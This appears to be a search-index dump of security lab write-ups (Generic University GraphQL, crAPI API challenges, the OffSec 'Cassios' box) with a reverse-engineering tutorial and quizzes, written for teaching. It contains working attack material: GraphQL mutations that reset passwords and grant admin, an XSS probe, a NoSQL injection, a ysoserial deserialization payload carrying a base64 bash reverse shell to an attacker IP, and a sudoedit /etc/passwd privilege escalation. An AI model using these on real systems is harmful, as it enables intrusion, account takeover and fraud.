Enumeration","text":"<ul> <li>Using graphw00f, we were able to determine that graphql is used and it can be found at <code>/graphql</code>.</li> </ul> <ul> <li> <p>Next we used ferox buster to enumerate for any other graphql endpoints.</p> </li> <li> <p>Following Hacktricks GraphQL guide, we did a \"Basic Enumeration\" and managed to find that there is yet another endpoint that was not discovered - \"Vulnerabilities\" </p> </li> </ul> <p></p> <ul> <li>We found out that <code>/vulnerabilities</code> is parked under <code>/admin</code></li> </ul> <p></p> <ul> <li>We then use the burp extension InQL, InQL Scanner to scan for the schema for graphQL used. </li> </ul> <p></p> <p>The above query can be visualised using graphql voyager where we can see the relationships of the different attributes.</p> <p></p> <ul> <li>We will be interested in the <code>mutation</code> schema as it can help understand what value the mutation can manipulate. </li> </ul> <p> </p>"},{"location":"OWASP_Labs/Generic%20University/#2b-mapping-attack-surface","title":"2b. Mapping Attack Surface","text":"<ul> <li>With the information gathered above, we can proceed to mapping the surface of attack.<ul> <li>API endpoints - Information Leakage</li> <li>GraphQL API endpoint - Probable Injection via mutation query.</li> <li>Display of user side data on admin panel (vulnerable vulnerability submission form) - probable XSS</li> </ul> </li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#3-vulnerability-assessment-exploitation","title":"3. Vulnerability Assessment / Exploitation","text":""},{"location":"OWASP_Labs/Generic%20University/#api-endpoints-information-leakage","title":"API Endpoints Information Leakage","text":"<ul> <li>As can be seen in #Further Exploration there is information leakage when <code>/api/[endpoint name]</code> is used. </li> <li>However, this way of listing things is not efficient as we have to manually correlate.</li> <li>Since GraphQL is available, we will use GraphQL to query the data according to what we need.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#graphql-api-injection","title":"GraphQL API Injection","text":""},{"location":"OWASP_Labs/Generic%20University/#query","title":"Query","text":""},{"location":"OWASP_Labs/Generic%20University/#find-administrator-emails","title":"Find Administrator Emails","text":"<ul> <li>Using the query below, we canlist all users, their emails and their roles</li> </ul> <pre><code>query {\n    users {\n    name\n    id\n    email\n    role{\n      id\n      name      \n    }\n    }\n}\n</code></pre> Admin Admin"},{"location":"OWASP_Labs/Generic%20University/#find-everyones-grades","title":"Find Everyone's Grades","text":"<ul> <li>Using the query below, we can list all classes, and the grades that corresponds to the students. </li> </ul> <pre><code>query {\n    class {\n           id\n           name\n           description\n           grades {\n                   grade\n                   comments\n                   user{\n                         id\n                         name\n                              }\n                  }\n          }\n}\n</code></pre>"},{"location":"OWASP_Labs/Generic%20University/#mutation","title":"Mutation","text":"<ul> <li>Over here we will demonstrate how mutations can be used to manipulate server side values.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#edit-someones-grades","title":"Edit Someone's Grades","text":"<ul> <li>When we query the class grades with #Find Everyone's Grades we notice that there is this student that is in <code>uni_class_id:2</code>, with <code>grade id: 22</code> and <code>user_id:5</code> with a low grade of 18. </li> <li>We also found a mutation query which takes in the following parameters.</li> </ul> <ul> <li>We shall attempt to help him push his grades to a better one with the <code>gradeMutation</code> query like below : </li> </ul> <pre><code>mutation {\n    gradeMutation(comments:\"code*\", created_at:\"code*\", uni_class_id:2, updated_at:\"code*\", user_id:5, grade:90, id:22) {\n        comments\n        created_at\n        updated_at\n        grade\n        id\n        user {\n            role {\n                created_at\n            }\n        }\n        class {\n            description\n        }\n    }\n}\n</code></pre> <ul> <li>As can be seen below, his grades are sucesfully changed.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#change-another-accounts-password","title":"Change Another Account's Password","text":"<ul> <li>We noticed that there is a mutation <code>updateUserPassword</code> which takes in User <code>id</code> as a string and <code>password</code> as a string.</li> </ul> <ul> <li>We attempt to change a random user's password by using this mutation</li> </ul> <pre><code>mutation {\n    updateUserPassword(password:\"123pass\", id:\"1\") {\n    id\n    name\n    password\n    role {\n       name\n         }\n    email\n    updated_at\n    }\n}\n</code></pre> <ul> <li>As can be seen above, we are able to login as the user \"Cicero Weimann\" with the password <code>123pass</code>.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#make-a-user-account-admin","title":"Make a user account Admin","text":"<ul> <li>We will now attempt to use the other mutation <code>userMutation</code> to see if we can do any things with it. </li> </ul> <ul> <li>Looking at the parameters, it seems like we might be able to change an account's role id. We might even be able to change it's name.</li> </ul> <pre><code>mutation {\n    userMutation(role_id:1, name:\"attacker\", id:1) {\n    id\n    name\n    password\n    role {\n       name\n         }\n    email\n    updated_at\n    }\n}\n</code></pre> <ul> <li> <p>So it seems we have successfully made this student an \"Admin\" and changed his name into \"attacker\".</p> </li> <li> <p>This is verified by the fact that we can run the <code>/restore</code> and <code>/delete</code> function which we were unable to call without admin rights.</p> </li> </ul> <p> </p>"},{"location":"OWASP_Labs/Generic%20University/#xss-on-vulnerable-forms","title":"XSS on vulnerable forms","text":"<ul> <li>From above, we know that the inputs form <code>/admin/security</code> page comes form \"Report a Security Vulnerability\" Form.</li> <li>In the form, we see that there are three input fields. </li> <li>We therefore manually test each input field with the following payload </li> </ul> <pre><code>&lt;script&gt;alert()&lt;/script&gt;\n</code></pre> <ul> <li>Based on out test which can be seen below, only \"The Issue\" field is vulnerable to XSS.</li> </ul>"},{"location":"OWASP_Labs/crAPI/","title":"crAPI","text":"<p>Trying this lab out to come up with templates and template generation logic for apimap. As such, not all challenges are attempted. crAPI is also used to demonstrate how apimap template for crAPI can be used for API testing, PoC writing. </p> <p>We also did not come up with templates for brute-forcing of fuzzing. While it is possible to do such tasks with apimap we believe that it is not optimal and there are more effective tools out there.</p>"},{"location":"OWASP_Labs/crAPI/#bola-vulnerabilities","title":"BOLA Vulnerabilities","text":""},{"location":"OWASP_Labs/crAPI/#challenge-1-access-details-of-another-users-vehicle","title":"Challenge 1 - Access details of another user\u2019s vehicle","text":"<p>To solve the challenge, you need to leak sensitive information of another user\u2019s vehicle.</p> <p>Since vehicle IDs are not sequential numbers, but GUIDs, you need to find a way to expose the vehicle ID of another user. Find an API endpoint that receives a vehicle ID and returns information about it.</p> <p>Upon logging in we noticed that there is an <code>/identity/api/v2/vehicle/{uuid}/location</code> API.   This API gets the coordinates of the car.  We can test this by keying another valid UUID. To get another UUID we would need to rely on #Challenge 4 - Find an API endpoint that leaks sensitive information of other users.</p> <p>Using a valid <code>vehicleid</code> we attempt to check vehicle location unauthenticated.  Seems like we will be given a 401 Error, with \"Invalid Token\" </p> <p>We then replayed the request for our own vehicle with our own token.  </p> <p>Using the same Authorization token, we attempt to replay another valid <code>vehicleid</code>  As can be seen from the response, we are able to get another car's information.  </p>"},{"location":"OWASP_Labs/crAPI/#challenge-2-access-mechanic-reports-of-other-users","title":"Challenge 2 - Access mechanic reports of other users","text":"<p>crAPI allows vehicle owners to contact their mechanics by submitting a \"contact mechanic\" form. This challenge is about accessing mechanic reports that were submitted by other users.</p> <p>We start our analysis of mechanic report by first submitting a report of our own.  We noticed in the response, there is an <code>/api/mechanic/mechanic_report?report_id=6</code>. This is not in the user interface we have.  We visited the link, and it seems like we are able to access our own report with no token needed!   We noticed that the report number is sequential. Hence we attempted to brute-force used intruder to retrieve all other reports.  Retrieving <code>report_id=2</code> </p> <p>Seems like there are only 6 reports.  </p>"},{"location":"OWASP_Labs/crAPI/#broken-user-authentication","title":"Broken User Authentication","text":""},{"location":"OWASP_Labs/crAPI/#challenge-3-reset-the-password-of-a-different-user","title":"Challenge 3 - Reset the password of a different user","text":"<p>Find an email address of another user on crAPI</p> <p>Brute forcing might be the answer. If you face any protection mechanisms, remember to leverage the predictable nature of REST APIs to find more similar API endpoints.</p> <p>We tried the forget password function and it seems like there are API calls are as follows: </p> <p>/identity/api/auth/forget-password Shown below is Request/Response when a valid email is sent  </p> <p>Then we tried to send an invalid email and the following is the Response.  This in itself is an issue. The error message is overly verbose and it can help in brute-forcing the email.</p> <p>/identity/api/auth/v3/check-otp Shown below is the Request/Response of a successful OTP password change.  </p> <p>Then a response when we sent invalid OTP. </p> <p>We can skip the brute-forcing of valid email since #Challenge 4 - Find an API endpoint that leaks sensitive information of other users is one such API that leaks the email address of other users.</p> <p>As such, we will only need to send a password reset request for an email and brute-force the OTP (4 numeric digits - 10000 possibilities).</p> <p>However, there seem to be some protection mechanism. </p> <p>After number of attempts exceeded, when we used the correct OTP below.  </p> <p>We get an ERROR response. The OTP has been invalidated. </p> <p>But we do notice something peculiar.  Most of the endpoints we have are <code>/v2/</code> however this is <code>/v3/</code>. Could there have been a <code>/identity/api/auth/v1/check-otp</code> or a <code>/identity/api/auth/v2/check-otp</code> endpoint?</p> <p>Going by this, we sent request to the respective paths. We found out that <code>/identity/api/auth/v1/check-otp</code> is non-existent  </p> <p>However, <code>/identity/api/auth/v2/check-otp</code> is a valid and working endpoint!</p> <p> </p> <p> </p> <p>And even after sending 20 payloads, we are not locked out! Seems like we can brute-force using this endpoint! </p> <p>As can be seen below, we have successfully changed the password of the user! </p>"},{"location":"OWASP_Labs/crAPI/#challenge-14-find-an-endpoint-that-does-not-perform-authentication-checks-for-a-user","title":"Challenge 14 - Find an endpoint that does not perform authentication checks for a user.","text":"<p>Through #Challenge 2 - Access mechanic reports of other users, we know that <code>/api/mechanic/mechanic_report?report_id={id}</code> endpoints does not require authentication.</p>"},{"location":"OWASP_Labs/crAPI/#excessive-data-exposure","title":"Excessive Data Exposure","text":""},{"location":"OWASP_Labs/crAPI/#challenge-4-find-an-api-endpoint-that-leaks-sensitive-information-of-other-users","title":"Challenge 4 - Find an API endpoint that leaks sensitive information of other users","text":"<p>We notice that API <code>/community/api/v2/community/posts/recent</code> called when we browse to <code>http://localhost:8888/forum</code> reveals more than just title and content of the post but also <code>vehicleid</code> </p>"},{"location":"OWASP_Labs/crAPI/#rate-limiting","title":"Rate-limiting","text":""},{"location":"OWASP_Labs/crAPI/#challenge-6-perform-a-layer-7-dos-using-contact-mechanic-feature","title":"Challenge 6 - Perform a layer 7 DoS using \u2018contact mechanic\u2019 feature","text":"<p>Owing to our #Challenge 11 - Make crAPI send an HTTP call to \"www[.]google[.]com\" and return the HTTP response. discovery we attempt to perform a layer 7 DoS by simply changing the url of <code>mechanic_api</code> to an invalid one, set <code>repeat_request_if_failed</code> to <code>true</code> and <code>number_of_repeats</code> to a large enough number.</p> <p> From the response, it seems like we have caused a layer 7 DoS. </p>"},{"location":"OWASP_Labs/crAPI/#mass-assignment","title":"Mass Assignment","text":""},{"location":"OWASP_Labs/crAPI/#challenge-8-get-an-item-for-free","title":"Challenge 8 - Get an item for free","text":"<p>crAPI allows users to return items they have ordered. You simply click the \"return order\" button, receive a QR code and show it in a USPS store. To solve this challenge, you need to find a way to get refunded for an item that you haven\u2019t actually returned.</p> <p>Leverage the predictable nature of REST APIs to find a shadow API endpoint that allows you to edit properties of a specific order.</p> <p>Analysing the business logic flow with burp, we realised that order returns are related to APIs with /orders in them. </p> <p>Again using the apimap, we extract the relevant endpoints from the API specs. </p> <p>An interesting API is the <code>/workshop/api/shop/orders/{order_id}</code> where there is a <code>GET</code> and a <code>PUT</code> method.  To get a valid <code>order_id</code>, we would first need to purchase an item and this would use the <code>POST</code> method on <code>/workshop/api/shop/orders/</code> endpoint  </p> <p>Shown below is a valid GET request, after we have purchased the item.</p> <p> Notice we only bought 1 and the variable quantity is 1. </p> <p>We analyse the API schema and it seems that we might be able to edit the ProductQuantity with the <code>PUT</code> request even after we have bought and paid for the item.</p> <p></p> <p>We test this out by sending the request as follows.</p> <p> We get an 200 OK response with the quantity altered. </p> <p>We send the corresponding <code>GET</code> request again to double confirm the change.  </p> <p>We are also able to do this to items that are return \"pending status\".  </p> <p>However, this did not increase our credit. Instead, within the API specs we found a peculiar error message.</p> <p></p> <p>Based on the request/response below, even though it is not documented, it seems like we might just be able to manipulate \"status\"</p> <p> </p> <p>True enough, we were able to change status from \"pending return\" back to \"delivered\".</p> <p> </p> <p>That being the case, perhaps if we change it to \"returned\" we might get more credit back than expected?</p> <p>We tested this idea out and upon changing \"status\" to \"returned\"   </p> <p>We were able to see an increase in our credit through the <code>GET /workshop/api/shop/products</code>.</p> <p> From $60.0 to $160.0  </p>"},{"location":"OWASP_Labs/crAPI/#challenge-9-increase-your-balance-by-1000-or-more","title":"Challenge 9 - Increase your balance by $1,000 or more","text":"<p>After solving the crAPI#Challenge 8 - Get an item for free challenge, be creative and find a way to get refunded for an item you never returned, but this time try to get a bigger refund.</p> <p>To do this we will just need to increase the quantity of items to &gt; 100 and then change the status from \"delivered\"/\"pending return\" to returned, just like how it was done in #Challenge 8 - Get an item for free.</p> <p>Another way to do this would be to continuously alter the \"status\" variable from \"delivered\"/\"pending return\" to \"returned\" This will be demonstrated in apimap's sample template!</p>"},{"location":"OWASP_Labs/crAPI/#ssrf","title":"SSRF","text":""},{"location":"OWASP_Labs/crAPI/#challenge-11-make-crapi-send-an-http-call-to-wwwgooglecom-and-return-the-http-response","title":"Challenge 11 - Make crAPI send an HTTP call to \"www[.]google[.]com\" and return the HTTP response.","text":"<p>There is something peculiar about the endpoint <code>/workshop/api/merchant/contact_mechanic</code> . </p> <p>In the highlighted portion we noticed that the request JSON contains fields <code>mechanic_api</code>,  <code>repeat_request_if_failed</code> and <code>number_of_repeats</code>. They seem to be configurations for sending request.</p> <p> The data within the response <code>response_from_mechanic_api</code> is not helping too! Seems like this is an API that calls another API!</p> <p>We attempted to repeat this request but changing the <code>mechanic_api</code> to <code>postman-echo[.]com</code>.</p> <p></p> <p>Request seem to be successful, and it seems like <code>response_from_mechanic_api</code> returns the response of the website(postman-echo)! Additionally, we seem to be able to use arbitrary information.</p> <p></p> <p>We tested the other request methods of postman-echo and it seems like only <code>GET</code> request is valid.</p> <p></p> <p>The API makes a <code>GET</code> request and returns the response from the GET request. Therefore when we change the <code>mechanic_api</code> to <code>google.com</code>, we will get back the response of google.com!  </p>"},{"location":"OWASP_Labs/crAPI/#injection","title":"Injection","text":""},{"location":"OWASP_Labs/crAPI/#challenge-12-find-a-way-to-get-free-coupons-without-knowing-the-coupon-code-nosql","title":"Challenge 12 - Find a way to get free coupons without knowing the coupon code. (NoSQL)","text":"<p>We looked at the coupon validation API and used a noSQL payloads to fuzz. We get mostly 422 Erros, where it is finding fault with our inputs,  indicating further that the database used is likely noSQL as it is processing the JSON.</p> <p> When <code>{\"$gt\":\"\"}</code> payload was used, for some reason a 200 OK response was the coupon code was displayed! </p>"},{"location":"OWASP_Labs/crAPI/#challenges-not-attempted","title":"Challenges Not Attempted","text":""},{"location":"OWASP_Labs/crAPI/#excessive-data-exposure-challenge-5-find-an-api-endpoint-that-leaks-an-internal-property-of-a-video","title":"(Excessive Data Exposure) Challenge 5 - Find an API endpoint that leaks an internal property of a video","text":"<p>In this challenge, you need to find an internal property of the video resource that shouldn\u2019t be exposed to the user. This property name and value can help you to exploit other vulnerabilities.</p>"},{"location":"OWASP_Labs/crAPI/#bfla-challenge-7-delete-a-video-of-another-user","title":"(BFLA) Challenge 7 - Delete a video of another user","text":""},{"location":"OWASP_Labs/crAPI/#mass-assignment-challenge-10-update-internal-video-properties","title":"(Mass Assignment) Challenge 10 - Update internal video properties","text":"<p>After solving the #Challenge 5 - Find an API endpoint that leaks an internal property of a video challenge, try to find an endpoint that would allow you to change the internal property of the video. Changing the value can help you to exploit another vulnerability.</p>"},{"location":"OWASP_Labs/crAPI/#injection-challenge-13-find-a-way-to-redeem-a-coupon-that-you-have-already-claimed-by-modifying-the-database-sql","title":"(Injection) Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database (SQL)","text":""},{"location":"OWASP_Labs/crAPI/#broken-authentication-challenge-15-find-a-way-to-forge-valid-jwt-tokens","title":"(Broken Authentication) Challenge 15 - Find a way to forge valid JWT Tokens","text":""},{"location":"PG/Linux%20-%20Cassios/","title":"Cassios","text":"<p>OffSec Difficulty : Intermediate | Community Difficulty : Very Hard | Personal Rating : Intermediate</p> <p>If you pay close attention to detail, you will be done before lunch. Otherwise, you will also be done before lunch... next week. </p>"},{"location":"PG/Linux%20-%20Cassios/#recon","title":"Recon","text":""},{"location":"PG/Linux%20-%20Cassios/#ports-scan","title":"Ports Scan","text":"<pre><code>python3 autorecon.py 192.168.127.116\n</code></pre> <p>Open Ports <pre><code>22/tcp   open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)\n80/tcp   open  http        syn-ack Apache httpd 2.4.6 ((CentOS))\n139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)\n445/tcp  open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)\n8080/tcp open  http-proxy  syn-ack\n</code></pre></p>"},{"location":"PG/Linux%20-%20Cassios/#ssh-enumeration-22","title":"SSH Enumeration (22)","text":"<p>From the enumeration of SSH, we see that OpenSSH_7.4 is used, and various authentication methods are supported here. However, nothing significant to exploit apart from brute forcing which did not work. <pre><code>22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)\n|_banner: SSH-2.0-OpenSSH_7.4\n| ssh-auth-methods: \n|   Supported authentication methods: \n|     publickey\n|     gssapi-keyex\n|     gssapi-with-mic\n|_    password\n| ssh2-enum-algos: \n|   kex_algorithms: (12)\n... \n...\n</code></pre></p>"},{"location":"PG/Linux%20-%20Cassios/#smb-enumeration-139445","title":"SMB Enumeration (139,445)","text":"<p>Below is an extracted version of the scan result, we can see that there is a share \"Samantha Konstan\" that we seem to have anonymous READ/WRITE permission for.</p>"},{"location":"PG/Linux%20-%20Cassios/#nmap-host-script","title":"Nmap + Host Script","text":"<pre><code>139/tcp open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)\nService Info: Host: CASSIOS\n\n445/tcp open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)\nService Info: Host: CASSIOS\n\n| smb-enum-shares: \n|   account_used: &lt;blank&gt;\n|   \\\\192.168.127.116\\IPC$: \n|     Type: STYPE_IPC_HIDDEN\n|     Comment: IPC Service (Samba 4.10.4)\n|     Users: 3\n|     Max Users: &lt;unlimited&gt;\n|     Path: C:\\tmp\n|     Anonymous access: READ/WRITE\n|   \\\\192.168.127.116\\Samantha Konstan: \n|     Type: STYPE_DISKTREE\n|     Comment: Backups and Recycler files\n|     Users: 0\n|     Max Users: &lt;unlimited&gt;\n|     Path: C:\\home\\samantha\\backups\n|     Anonymous access: READ/WRITE\n|   \\\\192.168.127.116\\print$: \n|     Type: STYPE_DISKTREE\n|     Comment: Printer Drivers\n|     Users: 0\n|     Max Users: &lt;unlimited&gt;\n|     Path: C:\\var\\lib\\samba\\drivers\n|_    Anonymous access: &lt;none&gt;\n| smb-ls: Volume \\\\192.168.127.116\\Samantha Konstan\n|   maxfiles limit reached (10)\n| SIZE   TIME                 FILENAME\n| &lt;DIR&gt;  2023-02-05T06:33:43  .\n| &lt;DIR&gt;  2020-09-24T17:38:10  ..\n| 0      2020-09-24T01:35:15  recycler.ser\n| 478    2020-09-24T17:32:50  readme.txt\n| &lt;DIR&gt;  2020-09-24T17:36:11  spring-mvc-quickstart-archetype\n| 4778   2020-09-24T17:35:01  spring-mvc-quickstart-archetype\\README.md\n| 774    2020-09-24T17:35:01  spring-mvc-quickstart-archetype\\archetype-catalog.xml\n| &lt;DIR&gt;  2020-09-24T17:35:01  spring-mvc-quickstart-archetype\\src\n| 1732   2020-09-24T17:36:11  spring-mvc-quickstart-archetype\\pom.xml\n| &lt;DIR&gt;  2020-09-24T17:36:54  thymeleafexamples-layouts\n|_\n</code></pre> <p>Host script was also able to list the files and we see a <code>readme.txt</code> and a <code>recycler.ser</code> file which might be interesting.</p>"},{"location":"PG/Linux%20-%20Cassios/#smbclient","title":"SMBClient","text":"<p>From SMBClient, we found out that the \"Samantha Konstan\" drive is a back up share. <pre><code>Anonymous login successful\n\nSharename       Type      Comment\n---------       ----      -------\nprint$          Disk      Printer Drivers\nSamantha Konstan Disk      Backups and Recycler files\nIPC$            IPC       IPC Service (Samba 4.10.4)\n</code></pre></p>"},{"location":"PG/Linux%20-%20Cassios/#smbmapsmbclient","title":"SMBMap/SMBClient","text":"<p><pre><code>smbmap -H 192.168.127.116 -R --depth 2 --exclude ADMIN$ IPC$ C$ -A readme\n</code></pre> Following this guide we downloaded the 2 interesting files using the command above and we read the readme file.</p> <p></p> <p>We cofirmed upload permission  <pre><code># connect to smb\nsmbclient //192.168.127.116/\"Samantha Konstan\"\n#inside smb shell\nsmb: &gt; put &lt;local file&gt; &lt;remote file name&gt;\n</code></pre></p> <p></p>"},{"location":"PG/Linux%20-%20Cassios/#web-enumeration-80-8080","title":"Web Enumeration (80, 8080)","text":""},{"location":"PG/Linux%20-%20Cassios/#browser-enumeration-port-80","title":"Browser Enumeration Port 80","text":"<p>\"Sign Up\" function does not seem to be working. </p>"},{"location":"PG/Linux%20-%20Cassios/#browser-enumeration-port-8080","title":"Browser Enumeration Port 8080","text":"<p>This seems to be the app that the <code>readme.txt</code> is for.  And we will need to use a username and password to access the dashboard. </p>"},{"location":"PG/Linux%20-%20Cassios/#directory-busting-port-80","title":"Directory Busting Port 80","text":"<p>From the results below we see some intersting output <code>/backup_migrate</code> </p> <p>When we visited we are given a directory listing seen below: </p> <p>Decompressing the recyler.tar is the source code and in this path <code>src/main/java/com/industrial/recycler/</code>, we find <code>WebSecurityConfig.java</code> file which contains username and password possibly for the webapp at port 8080. <code>recycler:DoNotMessWithTheRecycler123</code>.</p> <p></p>"},{"location":"PG/Linux%20-%20Cassios/#directory-busting-port-8080","title":"Directory Busting Port 8080","text":"<p>Nothing interesting here other than the login page. </p> <p>We login with the credentials given above and we get these 3 buttons which we do not know what it does.</p> <p></p>"},{"location":"PG/Linux%20-%20Cassios/#intial-foot-hold","title":"Intial Foot Hold","text":"<p>We look to the source code <code>src/main/java/com/industrial/recycler/DashboardController.java</code> </p> <p>Check function</p> <p></p> <p>Save function</p> <p></p> <p>We realised that this app is reading input from <code>/home/samantha/backups/recycler.ser</code> with the \"check\" button and writing output to <code>recycler.ser</code> with the \"save\" button.</p> <p>To confirm that the file that we have SMB access to is written when we click on the \"save\" button we login with SMBClient to view the file. <code>recycler.ser</code> has been altered.</p> <p></p> <p>We check what <code>.ser</code> file is and as can be seen below, .SER files are used to store serialized objects. </p> <p></p> <pre><code>try {\n     fis = new FileInputStream(filename);\n     in  = new ObjectInputStream(fis);\n     r   = (Recycler) in.readObject();\n     in.close();\n     } \ncatch (Exception ex) {\n     ex.printStackTrace();\n}\n</code></pre> <p>From the code above, we see that there is no sanitization of serialized object. <code>recycler.ser</code> file is passed as a file name into <code>fis</code> File object which is then passed as an input object <code>in</code> which is then passed as a serialised object <code>r</code> by the <code>readObject()</code> function which is vulnerable.</p> <p>We use ysoserial together with a hacktricks cheatsheet to generate the payload. (Java 16 and 17 will have issues running ysoserial) </p> <p>Base64 encoded bash reverse shell payload.</p> <p></p> <pre><code>java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjEyNy80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}\" &gt; recycler.ser\n</code></pre> <p>With smbclient we modified the original <code>recycler.ser</code> using the <code>PUT</code> command.</p> <p></p> <p>We click on check status and we get the reverse shell with user privilege .</p> <p></p>"},{"location":"PG/Linux%20-%20Cassios/#privilege-escalation","title":"Privilege Escalation","text":"<p>We uploaded and executed linpeas and we are given a few results that could lead to privilege escalation.</p> <p></p> <p>The most probable result would be the one below as running a local exploit for privilege escalation is not offsec...</p> <p></p> <p>The pattern for the above sudoedit permissions looks similar to the one found here. In our version to exploit, we will need to :</p> <ol> <li>create a subdirectory within the home folder and the file has to be named <code>recycler.ser</code></li> <li>create a symbolic link to the a new file named <code>recycler.ser</code> in the new folder pointing to the file that requires privileged access.</li> <li>run <code>sudoedit /home/directory/recycler.ser</code> with super user privilege.</li> </ol> <pre><code>#generate /etc/passwd username and password hash.\nopenssl passwd -1 -salt cyberches pwnpwn\n\n#carry out sudoedit exploit to edit /etc/passwd file\nmkdir /home/samantha/privesc\nln -s /etc/passwd /home/samantha/privesc/recycler.ser\nsudoedit /home/samantha/privesc/recycler.ser\n# in VIM G+A then add the below\n# cyberches:$1$cyberche$8SlOq4I5fdCWAmXseBSIU0:0:0:/root:/bin/bash\n# afterwards esc + enter then \":wq\" enter\n</code></pre> <p>After adding the credentials to the last line of <code>/etc/passwd</code>, we will do a <code>su cyberches</code>, enter the credentials and we got root!</p> <p></p>"},{"location":"RE101/3.%20Simple%20Lambdas/","title":"3. Simple Lambdas","text":"<p>Github Repo with Tools and Files</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_1","title":"Track3_1","text":"<p>This sample aims to show what it looks like in assembly when variable is initialised as a pointer and as an actual value.</p> <p>Additionally, it aims to show us how to manipulate types in IDA to make the output look like the source code that we are reversing.</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_1c","title":"Track3_1.c","text":"<p>In track3_1, we are given the following C file, which contains 2 structs, <code>SimpleContext</code> and <code>SimpleLambda</code>. As can be seen below, <code>SimpleLambda</code> will be making use of the <code>SimpleContext</code> and in the main function, we will simply be passing values into the  <pre><code>struct SimpleContext{\n   int Arg1;\n   int Arg2;\n};\nstruct SimpleLambda{\n   void *pCallback;\n   short Priority;\n   struct SimpleContext *pContext\n};\nint main(){\n   struct SimpleContext c;\n   c.Arg1 = 10;\n   c.Arg2 = 12;\n   struct SimpleLambda l;\n   l.priority =1;\n}\n</code></pre></p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_1exe","title":"Track3_1.exe","text":"<p>In the case of <code>Track3_1.exe</code>, the <code>.pdb</code> file exists, and hence we can find the structure of SimpleContext and SimpleLambda in local types (<code>Shift</code> + <code>F1</code>).   However, at this stage, looking at the disassembly below,   We simply just need to go to the \"local types\" window select the types we want, in this case <code>SimpleContext</code> and <code>SimpleLambda</code> then hit <code>enter</code> to import the structures.  And as can be seen below, the structs have been imported to our <code>structure</code> window.  We then go to the stack where the variables are stored (double-click on the variable) and then <code>alt</code>+<code>q</code> to convert the variables to the structure we want it to be.  As can be seen below, <code>Arg1</code> and <code>Arg2</code> is labeled on the disassembler view.  We also notice an interesting phenomena, where for <code>Priority</code> variable, we see the following instructions: <pre><code>mov eax,1\nmov [rbp+120h+var_F0], ax\n</code></pre></p> <p>For this we will need to reference #Track3_1.c, we know that <code>Priority</code> variable is declared as a <code>short Priority</code> which is 16bit or 2 bytes. <code>EAX</code> is 4 bytes or 32bits, and in this case, the initial value of Priority is transmitted to the EAX register first before 2 bytes from EAX, AX is being copied to the stack.</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#quiz","title":"Quiz","text":"<p>Q1. Please find the size of Arg1 field of SimpleContext Structure. How many bytes is it?</p> <p>Ans : 4</p> <p>Q2. To initialize the Priority field of SimpleLambda structure the compiler firstly puts 1 in EAX general purpose register, but then takes only AX part of it. Why?</p> <p>Ans : Priority field has short data type - two bytes long. The AX has the same length and compiler used this part of the register in instruction</p> <p>Q3. You could easily find the initial values for Arg1 and Arg2 on your program\u2019s stack. Could you do the same for the initial value for Priority? </p> <p>Ans : Yes, the initial value for Priority 1 the compiler decided to transmit through the general purpose register, not the stack, but anyway the resulting local var is on a stack</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_2","title":"Track3_2","text":"<p>This track aims to show how it looks like in assembly when there is a function call in assembly and also that pointer can point to pointers and pointing can be nested.</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_2c","title":"Track3_2.c","text":"<pre><code>struct SimpleContext{\n   int Arg1;\n   int Arg2;\n};\nstruct SimpleLambda{\n   void *pCallback;\n   short Priority;\n   struct SimpleContext *pContext\n};\nint SimpleCallback(struct SimpleContext *Context){\n   Context-&gt;Arg1 = 14;\n   return 0;\n}\n\nint main(){\n   struct SimpleContext c;\n   c.Arg1 = 10;\n   c.Arg2 = 12;\n   struct SimpleLambda l;\n   l.pCallback = simpleCallback;\n   l.priority =1;\n   l.pContext = &amp;c;\n}\n</code></pre>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_2exe","title":"Track3_2.exe","text":"<p>We have the following assembly.  We follow what we did for the first binary, where we import local types <code>SimpleContext</code> and <code>SimpleLambda</code>. However, this time we will attempt to utilise the local type <code>SimpleLambda</code>. To do so, we will need to identify <code>Priority</code> variable as we already did above, and follow it in the stack.  As can be seen above, the stack structure closely resembles that of the one in <code>SimpleLambda</code>. (We can refer to our source code too).  Therefore, we can guess that <code>var_F8</code> is likely the pointer to <code>callback</code> variable. As such, we can apply the structure starting from <code>var_F8</code>.  Shown above is the disassembly after all the renaming and we can see above that after adding all the structures, and renaming, the disassembly is resembles the actual code.</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#quiz_1","title":"Quiz","text":"<p>Q1.  Find the real start address of SimpleCallback function in track3_2.exe. Type your answer in the 0xXXXXXXXXX format without the initial zeros.</p> <p> Ans : 0x140011770</p> <p>Q2.  Which fields of SimpleLambda structure are pointers?</p> <p>Ans : <code>pCallback</code> and <code>pContext</code> fields are pointers, they contain addresses</p> <p>Q3. The pContext field in SimpleLambda structure is the pointer to SimpleContext custom data type. Could SimpleContext in its turn contain some fields with pointers? </p> <p>Ans : Yes, sure, C allows pointers to pointers to pointers and so on, it\u2019s not a problem</p>"},{"location":"RE101/3.%20Simple%20Lambdas/#track3_3","title":"Track3_3","text":"<p>Track3_3 attempts to show us the difference in disassembly when \"shallow copying\" is done vs \"deep copying\". Shallow copying is seen where variable <code>l</code> is directly assigned to variable <code>l2</code>  and deep copying is seen in the later part of the code where <code>memcpy()</code> is used to copy the value of <code>l</code> to <code>l2</code>.</p> <p>In the case of shallow copying, we see that what was copied was simply the address/pointers of the values(values in <code>l2</code> are simply pointed from <code>l</code>) which might not be ideal whereas for \"deep copying\" the address/pointers are not copied 